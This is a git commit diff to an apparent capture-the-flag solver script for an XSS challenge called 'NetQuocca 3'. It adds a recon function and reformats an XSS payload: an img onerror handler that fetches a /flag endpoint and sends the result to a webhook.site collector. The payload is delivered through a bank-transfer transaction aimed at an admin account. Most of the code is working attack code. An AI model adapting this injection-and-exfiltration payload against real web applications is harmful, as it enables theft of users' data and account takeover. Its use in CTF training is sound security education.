57cf9e60c1e3bd7123bf718d1d2a66149dd23f77
SAW <99191294+nicsaw@users.noreply.github.com>
2025-04-26 17:21:07 +1000

    NetQuocca 3: recon

--- ctf/4-XSS/netquocca_3.py
+++ ctf/4-XSS/netquocca_3.py
@@ -3,15 +3,21 @@ from pathlib import Path
 sys.path.append(str(Path(__file__).resolve().parent.parent))
 from utils import get_session, WebhookSite
 
+BASE_URL = "https://netquocca.quoccacorp.com"
+API_BASE_URL = "https://api.netquocca.quoccacorp.com"
+
 class Solver:
     def __init__(self):
         self.session = get_session()
         self.webhooksite = WebhookSite()
 
-    def main(self):
-        BASE_URL = "https://netquocca.quoccacorp.com"
-        API_BASE_URL = "https://api.netquocca.quoccacorp.com"
+    # Recon: https://netquocca.quoccacorp.com/?transaction=76
+    def get_source_code(self) -> str:
+        transaction_id = self.session.get(f"{API_BASE_URL}/transactions").json()["transactions"][0]["id"]
+        response = self.session.get(BASE_URL, params={"transaction": transaction_id})
+        return response.text
 
+    def main(self):
         response = self.session.get(f"{API_BASE_URL}/accounts")
         my_account = response.json()["accounts"][0]
         my_bsb, my_account_number = my_account["bsb"], my_account["account_number"]
@@ -20,7 +26,9 @@ class Solver:
         ADMIN_ACCOUNT_NUMBER = "00000000"
 
         # Exploit for loop mutation bug
-        DESKTOP_SITE_PAYLOAD = f'''<img src="x" x-data onerror="fetch(`{API_BASE_URL}/flag`).then(response => response.text()).then(responseText => fetch(`{self.webhooksite.url}?q=${{responseText}}`))">'''
+        DESKTOP_SITE_PAYLOAD = f'''<img src="x" INVALIDATTRIBUTE onerror="fetch(`{API_BASE_URL}/flag`)
+.then(response => response.text())
+.then(responseText => fetch(`{self.webhooksite.url}?q=${{responseText}}`))">'''
         response = self.session.post(f"{API_BASE_URL}/transactions", json={
             "from_account": { "bsb": my_bsb, "account_number": my_account_number },
             "to_account": { "bsb": ADMIN_BSB, "account_number": ADMIN_ACCOUNT_NUMBER },
